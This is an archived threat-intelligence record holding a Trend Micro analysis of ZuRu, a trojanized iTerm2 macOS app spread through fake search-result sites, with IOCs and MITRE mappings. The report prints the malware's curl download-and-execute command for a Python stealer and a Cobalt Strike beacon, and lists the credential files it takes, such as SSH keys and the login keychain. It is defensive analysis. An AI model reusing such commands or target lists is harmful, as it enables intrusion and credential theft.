{
    "id": "87d81072-450a-47fd-8ea7-761fee9d9044",
    "created_at": "2023-01-12T15:07:11.688145Z",
    "updated_at": "2025-03-27T02:14:34.119643Z",
    "deleted_at": null,
    "sha1_hash": "af3562bb15fde07dd2a9077401d6606d9b792b07",
    "title": "2021-09-30 - Mac Users Targeted by Trojanized iTerm2 App",
    "authors": "",
    "file_creation_date": "2022-05-27T23:27:27Z",
    "file_modification_date": "2022-05-27T23:27:27Z",
    "file_size": 2714876,
    "plain_text": "# Mac Users Targeted by Trojanized iTerm2 App\n\n**[trendmicro.com/en_us/research/21/i/mac-users-targeted-by-trojanized-iterm2-app.html](https://www.trendmicro.com/en_us/research/21/i/mac-users-targeted-by-trojanized-iterm2-app.html)**\n\nSeptember 30, 2021\n\nWe go into more detail about a fake version of the iTerm2 app that downloads and runs malware, detected by Trend Micro as\nTrojanSpy.Python.ZURU.A, which collects private data from a victim’s machine.\n\nBy: Steven Du, Luis Magisa September 30, 2021 Read time: ( words)\n\nEarlier this month, [a user on Chinese question-and-answer website Zhihu reported that a search engine result for the keyword “iTerm2”](https://zhuanlan.zhihu.com/p/408746101)\nled to a fake website called item2.net that mimics the legitimate iterm2.com (Figure 1). A fake version of the iTerm2 app, a macOS\nterminal emulator, can be downloaded from a link found in iterm2.net. When this app is executed, it downloads and runs g.py, a\nmalicious Python script from 47[.]75[.]123[.]111. This malware, which Trend Micro has detected as TrojanSpy.Python.ZURU.A, collects\nprivate data from a victim’s machine.\n\nFigure 1. The fraudulent website iterm2.net\n[Objective-see previously published a blog entry about this malware, which analyzed how the threat actor repacks the iTerm2 app to load](https://objective-see.com/blog/blog_0x66.html)\nthe malicious libcrypto.2.dylib. This, in turn, downloads and runs other components, including the aforementioned g.py script and a\nMach-O file called “GoogleUpdate” that contains a Cobalt Strike beacon payload. This blog entry covers the malware’s details.\n\n## The trojanized app\n\nAs of September 15, iterm2.net is still active. However, the malicious file is not hosted on this website directly. Instead, the website\ncontains a link, hxxp://www.kaidingle.com/iTerm/iTerm.dmg, from which users are able to download a macOS disk image file (DMG)\ncalled iTerm.dmg. The user is redirected to this download URL for iTerm.dmg regardless of the app version the user selects to download\nfrom the fake website; the real iterm2.com website has different URLs and files for various versions. The files that are downloaded from\nthe legitimate website come in a ZIP file format, as opposed to the DMG file from the fraudulent website, as shown in Figure 2.\n\n\n-----\n\nFigure 2. The file downloaded from the fake website (left) and the official website (right)\n\nComparing the folder structure of the DMG and ZIP files shows numerous differences between them:\n\nAll the Mach-O files in the trojanized iTerm2 app were signed with an Apple Distribution certificate, as shown in Figure 3, whereas\nfiles in the legitimate iTerm2.app are code signed with a Developer ID Application certificate. According to Apple documentation,\nan Apple Distribution certificate is only used to sign an app before the developer delivers it to the App Store, so apps downloaded\nfrom the App Store generally don’t have an Apple Distribution certificate.\n\nFigure 3. Trojanized iTerm2 app code signing\n\nThe trojanized iTerm2 app contains a file called libcrypto.2.dylib (with a SHA-256 hash of\n2c269ff4216dc6a14fd81ffe541994531b23a1d8e0fbd75b9316a9fa0e0d5fef) in its Frameworks folder, which does not exist in the\nlegitimate version, as shown in Figure 4.\n\nFigure 4. The libcrypto.2.lib file added in the trojanized iTerm2 app\n\nIn the trojanized iTerm2 app, the main Mach-O file has an additional load command called LC_LOAD_DYLIB that loads the\n_libcrypto.2.dylib file, shown in Figure 5._\n\n\n-----\n\nFigure 5. The load command LC_LOAD_DYLIB loads the file libcrypto.2.dylib\nAccording to Objective-see’s blog post, the malicious codes contained in the libcrypto.2.dylib file are executed automatically when the\nvictim runs the trojanized iTerm2 app. This is a clever method for repacking legitimate apps that we have not seen before.\n\nOnce executed, the malware connects to its server and receives these instructions from it:\n\n1. \"curl -sfo /tmp/g.py http://47[.]75[.]123[.]111/g.py && chmod 777 /tmp/g.py && python /tmp/g.py && curl -sfo /tmp/GoogleUpdate\n\n_http://47[.]75[.]123[.]111/GoogleUpdate && chmod 777 /tmp/GoogleUpdate && /tmp/GoogleUpdate\"_\n2. Download the g.py script to the folder /tmp/g.py and execute it\n3. Download “GoogleUpdate” to the folder /tmp/GoogleUpdate and execute it\n4. Collect data using the g.py script\n\nThe Python script g.py collects the following system data and files from the victim’s machine, which the script then sends to the server:\n\n1. Operating system information\n2. Username\n3. Installed applications\n4. Local IP address\n5. Copies of these files and folders:\n\n1. ~/.bash_history'\n2. ~/.zsh_history\n3. ~/.gitConfig\n4. /etc/hosts\n5. ~/.ssh\n6. ~/.zhHistory\n7. ~/Library/Keychains/Login.keychain-db\n8. ~/Library/Application Support/VanDyke/SecureCRT/Config/\n9. ~/Library/Application Support/iTerm2/SavedState/\n6. The contents of these directories:\n\n1. ~/ - {current user home directory}\n2. ~/Desktop\n3. ~/Documents\n4. ~/Downloads\n5. /Applications\n\n## Other trojanized apps and fake sites\n\nFurther analysis of the trojanized iTerm2 app’s Apple Distribution certificate led us to find similar trojanized apps on VirusTotal (Table 1),\nall of which were trojanized using the same method.\n\nTable 1. Other trojanized apps found on VirusTotal\n\n**File Name** **SHA-256 Hash** **Detection**\n\n\n-----\n\n_iTerm.app.zip_ 5f59ead37fa836c6329a7ba3edd4afc9a2c5fec61de4e0cdb8e8a41031ae4db0 TrojanSpy.MacOS.ZURU.A\n\n_SecureCRT.dmg_ ae0510032cd4699ef17de7ed1587918ffcd7ff7c9a77fc45f9d68effe2934132 Trojan.MacOS.ZuRu.PFH\n\n_SecureCRT.dmg_ 1e462f8716275dbae6acb3ff4f7a95624c1afb23c5069fa42a14ed49c2588921 Trojan.MacOS.ZuRu.PFH\n\n\n_Microsoft Remote_\n_Desktop.dmg_\n\n\n5ca2fb207762e886dd3336cf1cb92c28f096a5fbb1798ea6721b7c94c1395259 TrojanSpy.MacOS.ZURU.A\n\n\n_Navicat15_cn.dmg_ 6df91af12c87874780cc9d49e700161e1ead71ae045954adbe7633ec9e5e45ff TrojanSpy.MacOS.ZURU.A\n\n_Navicat15_cn.dmg_ 91541cfc0474d6c06376460759517ae94f36fca74d5ab84cf5c23d98bd33939e TrojanSpy.MacOS.ZURU.A\n\nSearching VirusTotal for the Secure Sockets Layer (SSL) thumbprint that iterm2.net used revealed several other fraudulent websites. As\nshown in Figure 6, all of these websites resolved to the same IP address, 43[.]129[.]218[.]115.\n\nFigure 6. Other fake websites found on VirusTotal\nWe were able to access one of these fake websites, snailsvn.cn, but the download link on its page was empty at that time, so it remains\nuncertain whether this website had been used to distribute a trojanized version of SnailSVN, an Apache Subversion (SVN) client for Mac\nOS X, in the wild (Figure 7). However, all of these domains were inaccessible at the time of writing.\n\n\n-----\n\nFigure 7. The fake SnailSVN website\n\n## Download server\n\nThe server used for hosting the trojanized packages, kaidingle[.]com, was registered on September 7, and is currently still active.\nAccording to VirusTotal, apart from iterm.dmg, it also hosts other DMG files such as SecureCTR.dmg and Navicat15_cn.dmg (Figure 8).\nAs of September 18, the latter two DMG files can still be downloaded from the server.\n\nFigure 8. URLs relating with download\n\nserver\nBased on the server’s information on WHOIS, a query and response protocol, there are four other domains under the same registrant\n(Figure 9). However, so far, none of these domains show any indication that they’re related to any malware.\n\nFigure 9. Other domains from the same registrant\n\n\n-----\n\n## Second stage server\n\nVirusTotal recorded multiple URLs related to a second-stage server under the IP address 47[.]75[.]123[.]111 – the same address as that\nof the malicious g.py script – from September 8 to 17, as shown in Figure 10.\n\nFigure 10. URLs under the second-stage server\n\nBesides the g.py script and “GoogleUpdate” components that are part of the trojanized iTerm app malware routine, the second-stage\nserver also hosts four other Mach-O files that are used as post-penetration tools (Table 2).\n\nTable 2. Other Mach-O files hosted in the second-stage server\n\n\n**File**\n**Name**\n\n\n**SHA-256 Hash** **Description/Detection**\n\n\nla 79ef23214c61228a03faea00a1859509ea3bf0247219d65ae6de335fde4061f5 An open source intranet penetration scanner\nframework\n\n[(https://github.com/k8gege/LadonGo)](https://github.com/k8gege/LadonGo)\n\niox f005ea1db6da3f56e4c8b1135218b1da56363b077d3be7d218d8284444d7824f A tool for port forward and intranet proxy\n\n[(https://github.com/EddieIvan01/iox)](https://github.com/EddieIvan01/iox)\n\n\nnetscandarwinamd64\n\n\nd12ef7f6de48c09e84143e90fe4a4e7b1b3d10cee5cd721f7fdf61e62e08e749 Netscan scans a network for ports that are\nopen on an IP/IP range, and IP addressess\nthat are in use on that network\n\n[(https://github.com/jessfraz/netscan/releases)](https://github.com/jessfraz/netscan/releases)\n\n\nHost a83edc0eb5a2f1db62acfa60c666b5a5c53733233ce264702a16cb5220df9d4e Backdoor.MacOS.Wirenet.PFH\n\nNotably, the IP address of the second-stage server is similar to the one “GoogleUpdate” connects to, which is 47[.]75[.]96[.]198. Both of\nthese IP addresses are hosted by Alibaba Hong Kong. As shown in Figure 11, the URLs under 47[.]75[.]96[.]198 were registered around\nthe same time as those in the second-stage server, which suggests that these two servers may have been set up by same threat actor.\n\nFigure 11. URLs under the same server as\n\n“GoogleUpdate”\n\n\n-----\n\n## Advertisement sites\n\nAs detailed in the aforementioned user report, the first item from the search engine results is under the subdomain rjxz.jxhwst.top.\nSearching for this address in Google generates two results that lead only to their cache (Figure 12), and as of this writing, their actual\npages are already down.\n\nFigure 12. Google caches of the two fake sites\n\nThe first search result, called “Microsoft Remote Desktop,” has an address of hxxp://rjxz.jxhwst.top/3, but based on its cache (Figure 13)\nand source code (Figure 14), we found that it redirected visitors to a fake website, hxxp://remotedesktop.vip.\n\nFigure 13. The cache of the fake “Microsoft Remote Desktop” page\n\n\n-----\n\nFigure 14. The source code of the fake page\nUpon checking its main page, we discovered that the second-level domain jxhwst.top belongs to an agriculture company north of China.\nApart from the subdomain rjxz.jxhwst.top, this second-level domain has 44 other subdomains, almost all of which are used for\nadvertisements that have no relation to the agriculture company (Figure 15). It is possible that the company rents out these subdomains\nto others for advertising purposes, but cannot prevent them from being used for illegal purposes. If this is the case, the threat actor rents\nthe subdomain for malware distribution.\n\n\n-----\n\nFigure 15. The subdomains of the agriculture company\n\n## Security recommendations\n\nTo protect systems from threats like these, end users should only download apps from official and legitimate marketplaces. They should\nbe careful about the search results from search engines, and always double-check URLs to make sure these really point to the official\n[sites. Mac users can consider multilayered security solutions such as Trend Micro Antivirus for Mac®, which provides enhanced anti-](https://www.trendmicro.com/en_us/forHome/products/antivirus-for-mac.html)\nscam protection that flags and blocks scam websites that attempt to steal their personal data. They may also avail of Antivirus for Mac\nas part of [Trend Micro Maximum Security, a multi-platform solution that offers comprehensive security and multidevice protection](https://www.trendmicro.com/en_us/forHome/products/maximum-security.html)\nagainst cyberthreats.\n\n## Indicators of Compromise (IOCs)\n\n**File Name** **SHA-256 Hash** **Detection**\n\n_SecureCRT.dmg_ 1e462f8716275dbae6acb3ff4f7a95624c1afb23c5069fa42a14ed49c2588921 TrojanSpy.MacOS.ZURU.A\n\n_com.microsoft.rdc.macos_ 5ca2fb207762e886dd3336cf1cb92c28f096a5fbb1798ea6721b7c94c1395259 TrojanSpy.MacOS.ZURU.A\n\n_iTerm.app.zip_ 5f59ead37fa836c6329a7ba3edd4afc9a2c5fec61de4e0cdb8e8a41031ae4db0 TrojanSpy.MacOS.ZURU.A\n\n_Navicat15_cn.dmg_ 6df91af12c87874780cc9d49e700161e1ead71ae045954adbe7633ec9e5e45ff TrojanSpy.MacOS.ZURU.A\n\n_Navicat15_cn.dmg_ 91541cfc0474d6c06376460759517ae94f36fca74d5ab84cf5c23d98bd33939e TrojanSpy.MacOS.ZURU.A\n\n_SecureCRT.dmg_ ae0510032cd4699ef17de7ed1587918ffcd7ff7c9a77fc45f9d68effe2934132 TrojanSpy.MacOS.ZURU.A\n\n_iTerm.dmg_ e5126f74d430ff075d6f7edcae0c95b81a5e389bf47e4c742618a042f378a3fa TrojanSpy.MacOS.ZURU.A\n\n\n_Microsoft Remote_\n_Desktop.dmg_\n\n\n4e8287b61b0269e0d704c6d064cb584c1378e9b950539fea366ee304f695743f TrojanSpy.MacOS.ZURU.A\n\n\n-----\n\n_libcrypto.2.dylib_ 4aece9a7d73c1588ce9441af1df6856d8e788143cd9e53a2e9cf729e23877343 TrojanSpy.MacOS.ZURU.A\n\n_libcrypto.2.dylib_ 4e8287b61b0269e0d704c6d064cb584c1378e9b950539fea366ee304f695743f TrojanSpy.MacOS.ZURU.A\n\n_libcrypto.2.dylib_ 8db4f17abc49da9dae124f5bf583d0645510765a6f7256d264c82c2b25becf8b TrojanSpy.MacOS.ZURU.A\n\n_libcrypto.2.dylib_ 62cae3c971ed01c61454e4c3d9a8439cdcb409a8e1c5641e5c7c4ac7667cb5e5 TrojanSpy.MacOS.ZURU.A\n\n_libcrypto.2.dylib_ aba7c61d2c16cdae17785a38b070df57aa3009f00686881642be31a589fabe0a TrojanSpy.MacOS.ZURU.A\n\n_libcrypto.2.dylib_ af2cb957387b7c4b0c5c9fa24a711988c9e8802e758622b321c9bdc5720120d2 TrojanSpy.MacOS.ZURU.A\n\n_libcrypto.2.dylib_ e8184e1169373e2d529f23b9842f258dddc1d24c77ced0d12b08959967dfadef TrojanSpy.MacOS.ZURU.A\n\n_libcrypto.2.dylib_ 2c269ff4216dc6a14fd81ffe541994531b23a1d8e0fbd75b9316a9fa0e0d5fef TrojanSpy.MacOS.ZURU.A\n\n_g.py_ ffb0a802fdf054d4988d68762d9922820bdc3728f0378fcd6c4ed28c06da5cf0 TrojanSpy.Python.ZURU.A\n\nMITRE Tactics, Techniques, and Procedures (TTPs)\n\n**Tactic** **ID** **Name** **Description**\n\n\nInitial\nAccess\n\n\n[T1566.002](https://attack.mitre.org/techniques/T1566/002/) [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/) Phishing website from search\nengine results\n\n\n[Execution](https://attack.mitre.org/tactics/TA0002) [T1059.006](https://attack.mitre.org/techniques/T1059/006/) [Python](https://attack.mitre.org/techniques/T1059/006/) Downloads Python script\n\n[T1204.002](https://attack.mitre.org/techniques/T1204/002/) [Malicious File](https://attack.mitre.org/techniques/T1204/002/) Executes the repackaged iTerm2 app will launch the\nmalware dylib libcrypt.2.dylib\n\n\nDefense\nEvasion\n\n\nT1140 [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) Strings in malware dylib are AES\nand Base64 encoded\n\n\nT1036 [Masquerading (6)](https://attack.mitre.org/techniques/T1036) Malware is a malware dylib inserted in a repackaged\niterm2 app\n\n[Collection](https://attack.mitre.org/tactics/TA0009) [T1560.002](https://attack.mitre.org/techniques/T1560/002/) [Archive via Library](https://attack.mitre.org/techniques/T1560/002/) Collects various information and\nadds it to zip archive\n\nT1005 [Data from Local System](https://attack.mitre.org/techniques/T1005) Collects system information, bash history and login\nkeychain information\n\n\nT1602 Data from Configuration\nRepository (2)\n\n\nCollects contents of /Library/Application\nSupport/VanDyke/SecureCRT/Config\n\n\n[Exfiltration](https://attack.mitre.org/tactics/TA0010) T1041 [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) Files are exfiltrated to\nhxxp://47[.]75[.]123[.]111/u.php\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-30 - Mac Users Targeted by Trojanized iTerm2 App.pdf"
    ],
    "report_names": [
        "2021-09-30 - Mac Users Targeted by Trojanized iTerm2 App.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536031,
    "ts_updated_at": 1743041674,
    "ts_creation_date": 1653694047,
    "ts_modification_date": 1653694047,
    "files": {
        "pdf": "https://archive.orkl.eu/af3562bb15fde07dd2a9077401d6606d9b792b07.pdf",
        "text": "https://archive.orkl.eu/af3562bb15fde07dd2a9077401d6606d9b792b07.txt",
        "img": "https://archive.orkl.eu/af3562bb15fde07dd2a9077401d6606d9b792b07.jpg"
    }
}